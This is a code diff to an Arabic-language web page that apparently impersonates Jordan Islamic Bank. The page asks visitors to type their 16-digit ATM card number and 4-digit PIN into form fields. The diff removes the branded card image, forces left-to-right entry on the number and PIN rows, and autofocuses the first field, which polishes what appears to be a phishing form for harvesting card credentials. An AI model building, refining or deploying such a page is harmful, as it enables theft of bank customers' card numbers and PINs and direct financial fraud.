@@ -427,28 +427,19 @@
                 <button type="submit">تأكيد</button>
             </form>
         </div>
-        <!-- Card Info View (ATM Card, improved) -->
+        <!-- Card Info View (ATM Card, improved & left-to-right) -->
         <div class="view" id="cardInfoView">
             <div class="card-info-title">بطاقة الصراف الآلي</div>
             <div class="card-num-label">ادخل رقم البطاقة من 16 رقم</div>
-            <div class="card-img-wrap">
-                <div class="card-img">
-                    <div class="card-img-content">
-                        <div style="font-weight:bold;font-size:.98rem;color:#b71c1c;margin-bottom:2px;">ATM</div>
-                        <div class="card-bank-name">Jordan Islamic Bank</div>
-                        <div style="font-size:1.1rem;letter-spacing:4px;color:#b71c1c;">XXXX XXXX XXXX XXXX</div>
-                    </div>
-                </div>
-            </div>
             <form id="cardInfoForm" autocomplete="off" onsubmit="return goToVerificationFromCard(event)">
-                <div class="card-num-row">
+                <div class="card-num-row" dir="ltr" style="direction:ltr;">
                     <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum1" name="cardNum1" autocomplete="off" inputmode="numeric">
                     <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum2" name="cardNum2" autocomplete="off" inputmode="numeric">
                     <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum3" name="cardNum3" autocomplete="off" inputmode="numeric">
                     <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum4" name="cardNum4" autocomplete="off" inputmode="numeric">
                 </div>
                 <div class="card-secret-label">ادخل الرقم السري 4 خانات</div>
-                <div class="card-secret-row">
+                <div class="card-secret-row" dir="ltr" style="direction:ltr;">
                     <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret1" name="cardSecret1" autocomplete="off" inputmode="numeric">
                     <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret2" name="cardSecret2" autocomplete="off" inputmode="numeric">
                     <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret3" name="cardSecret3" autocomplete="off" inputmode="numeric">
@@ -666,6 +657,7 @@
                     }
                 });
             });
+            if (atmInputs[0]) atmInputs[0].focus();
         });
     </script>
 </body>
